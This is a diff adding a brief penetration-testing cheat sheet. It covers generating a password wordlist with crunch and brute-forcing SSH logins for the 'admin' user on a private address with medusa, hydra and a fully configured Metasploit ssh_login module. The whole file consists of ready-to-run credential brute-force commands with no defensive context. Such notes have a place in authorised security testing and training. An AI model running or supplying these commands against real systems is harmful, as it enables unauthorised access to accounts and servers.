@@ -1,0 +1,24 @@
+crunch -> password list generator
+	crunch 4 4 ad12 > wordlist.txt
+		4	4 character min length
+		4	4 character max length
+		ad12	contains only the a d 1 and 2 characters
+
+
+Password Brute Forcing tools:
+
+SSH
+	medusa -h 192.168.1.101 -u admin -P ./wordlist.txt -M ssh
+
+	hydra -l admin -P ./wordlist.txt 192.168.1.101 ssh
+
+	Metasploit
+		use auxiliary/scanner/ssh/ssh_login
+		set BLANK_PASSWORDS false
+		set PASS_FILE /home/jtharel/wordlist.txt
+		set RHOSTS 192.168.1.101
+		set STOP_ON_SUCCESS true
+		set USERNAME admin
+		set THREADS 20
+		set VERBOSE true
+		run
